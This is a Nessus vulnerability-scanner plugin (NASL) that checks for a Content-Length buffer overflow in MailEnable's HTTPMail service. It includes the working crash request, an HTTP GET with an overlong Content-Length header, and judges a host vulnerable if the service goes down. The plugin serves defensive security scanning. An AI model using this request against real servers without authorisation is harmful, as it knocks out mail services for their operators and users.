#
# This script was written by George A. Theall, <theall@tifaware.com>.
#
# See the Nessus Scripts License for details.
#


include("compat.inc");

if (description)
{
  script_id(14655);
  script_version("$Revision: 1.13 $");
  script_cvs_date("$Date: 2016/10/27 15:03:54 $");

  script_bugtraq_id(10838);
  script_osvdb_id(8301);

  script_name(english:"MailEnable HTTPMail Service Content-Length Header Overflow");
  script_summary(english:"Checks for Content-Length Overflow Vulnerability in MailEnable HTTPMail Service");
 
  script_set_attribute(attribute:"synopsis", value:
"The remote web server is affected by a buffer overflow vulnerability." );
  script_set_attribute(attribute:"description", value:
"The target is running at least one instance of MailEnable that has a
flaw in the HTTPMail service (MEHTTPS.exe) in the Professional and
Enterprise Editions.  The flaw can be exploited by issuing an HTTP GET
with an Content-Length header exceeding 100 bytes, which causes a
fixed-length buffer to overflow, crashing the HTTPMail service and
possibly allowing for arbitrary code execution." );
  script_set_attribute(attribute:"see_also", value:"http://www.mailenable.com/hotfix/" );
  script_set_attribute(attribute:"see_also", value:"http://seclists.org/fulldisclosure/2004/Aug/30" );
  script_set_attribute(attribute:"solution", value:
"Upgrade to MailEnable Professional / Enterprise 1.2 or later.
Alternatively, apply the HTTPMail hotfix from 9th August 2004." );
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"plugin_publication_date", value: "2004/09/03");
  script_set_attribute(attribute:"vuln_publication_date", value: "2004/07/30");
  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:mailenable:mailenable");
  script_end_attributes();
 
  script_category(ACT_DENIAL);
  script_copyright(english:"This script is Copyright (C) 2004-2016 George A. Theall");

  script_family(english:"CGI abuses");

  script_dependencies("http_version.nasl");
  script_require_ports("Services/www", 8080);

  exit(0);
}


include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");


port = get_http_port(default:8080);
if (!get_port_state(port)) exit(0);
if (http_is_dead(port:port)) exit(0);


# Make sure banner's from MailEnable.
banner = get_http_banner(port:port);
if (banner && egrep(pattern:"^Server: .*MailEnable", string:banner)) {
  # Try to bring it down.
  req = string(
    "GET / HTTP/1.0\r\n",
    "Content-Length: ", crap(length:100, data:"9"), "XXXX\r\n",
    "\r\n"
  );
  debug_print("req='", req, "'.\n");
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  debug_print("res='", res, "'.\n");

  # There's a problem if the web server is down.
  if (isnull(res)) {
    if (http_is_dead(port:port)) security_hole(port);
  }
}
